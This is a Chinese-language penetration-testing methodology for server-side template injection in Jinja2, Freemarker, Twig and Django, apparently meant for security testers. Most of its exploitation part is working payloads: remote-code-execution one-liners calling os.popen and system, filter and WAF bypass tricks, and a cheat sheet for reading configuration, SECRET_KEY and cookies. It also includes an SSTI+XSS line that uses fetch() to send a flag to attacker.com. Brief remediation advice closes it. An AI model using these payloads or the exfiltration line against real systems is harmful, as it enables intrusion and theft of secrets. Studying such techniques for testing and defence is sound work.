# 模板注入攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的模板注入漏洞检测和利用流程。

## 1.2 适用范围

本文档适用于使用模板引擎的 Web 应用，包括 SSTI（服务端模板注入）。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

模板注入是指攻击者能够向模板引擎注入恶意模板代码，导致任意代码执行。

**本质问题**：
- 用户输入直接拼接到模板
- 模板引擎未沙箱化
- 缺少输入验证

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-94 | 代码注入 |
| CWE-1336 | 模板引擎不当使用 |

## 2.2 攻击常见于哪些业务场景

| 模板引擎 | 风险点 | 潜在危害 |
|---------|-------|---------|
| Jinja2 (Python) | 用户输入渲染 | RCE |
| Freemarker (Java) | 模板渲染 | RCE |
| Twig (PHP) | 模板渲染 | RCE |
| Velocity (Java) | 模板渲染 | RCE |
| Pug (Node.js) | 模板渲染 | RCE |
| Django Template (Python) | 模板字符串拼接 | 敏感数据泄露/RCE |

## 2.3 漏洞发现方法

### 2.3.1 基础探测

```
# 测试数学运算
{{7*7}} → 49 (存在注入)
${7*7} → 49
<%= 7*7 %> → 49

# 测试字符串拼接
{{'a'+'b'}} → ab
```

### 2.3.2 引擎识别

```python
# Jinja2
{{config}}
{{self}}
{{request}}

# Freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>

# Twig
{{_self.env.registerUndefinedFilterCallback}}

# Velocity
#set($x = '')

# Django Template
{{config}}
{{request}}
{{FLAG}}
{{self}}
```

### 2.3.3 自动化检测

```bash
# 使用 TPLMap
git clone https://github.com/epinna/tplmap
python tplmap.py -u "http://target.com/page?name=*"

# 使用 Burp Suite
# 主动扫描模板注入
```

## 2.4 漏洞利用方法

### 2.4.1 Jinja2 RCE

```python
# 方法 1：使用 cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 方法 2：使用 joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# 方法 3：使用 namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}

# 方法 4：使用 self
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### 2.4.2 Freemarker RCE

```freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}

<#assign cmd="id">
<#assign process=cmd?exec()>
```

### 2.4.3 Twig RCE

```twig
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.filter("id")}}

{{['id']|filter('system')}}
```

### 2.4.4 信息收集

```python
# Jinja2 获取配置
{{config}}

# 获取环境变量
{{config.items()}}

# 获取请求信息
{{request.headers}}
{{request.cookies}}
```

## 2.5 漏洞利用绕过方法

### 2.5.1 过滤器绕过

```python
# 如果 | 被过滤
# 使用 [] 代替
{{config['items']()}}

# 如果 . 被过滤
# 使用 [] 代替
{{config|attr('items')()}}

# 如果引号被过滤
# 使用 chr() 构造
{{chr(99)+chr(104)+chr(114)}}
```

### 2.5.2 WAF 绕过

```python
# 编码绕过
{{request|attr('\x61\x70\x70')}}

# 分块注入
{{config.items()|list|first}}
```

---

# 第三部分：附录

## 3.1 模板注入测试检查清单

```
□ 测试基础数学运算
□ 识别模板引擎
□ 测试对象访问
□ 测试 RCE
□ 测试信息泄露
□ 测试 WAF 绕过
```

## 3.2 常用 Payload 速查

| 引擎 | Payload | 说明 |
|-----|---------|------|
| Jinja2 | `{{config}}` | 获取配置 |
| Jinja2 | `{{cycler.__init__.__globals__.os.popen('id').read()}}` | RCE |
| Freemarker | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}` | RCE |
| Twig | `{{['id']\|filter('system')}}` | RCE |
| Django | `{{FLAG}}` | 提取模板上下文变量 |
| Django | `{{config}}` | 获取 Django 配置 |
| Django | `{{request.user}}` | 获取当前用户 |
| Django | `{{request.COOKIES}}` | 获取 Cookie |

### Django 模板注入专项 Payload

**场景：Django 应用将用户输入直接拼接到模板字符串**

```
# 直接提取模板上下文变量
GET /greet/?name={{FLAG}}

# 获取 Django 配置
GET /greet/?name={{config}}
GET /greet/?name={{config.SECRET_KEY}}

# 获取请求对象信息
GET /greet/?name={{request.headers}}
GET /greet/?name={{request.user}}
GET /greet/?name={{request.COOKIES}}

# SSTI + XSS 组合攻击（数据外带）
GET /greet/?name=<script>fetch('http://attacker.com/?flag={{FLAG}}')</script>
```

## 3.3 修复建议

1. **避免用户输入进入模板** - 使用变量而非模板拼接
2. **沙箱环境** - 使用沙箱模式的模板引擎
3. **输入验证** - 严格验证模板输入
4. **最小权限** - 限制模板可访问的对象

---

**参考资源**：
- [PortSwigger - SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
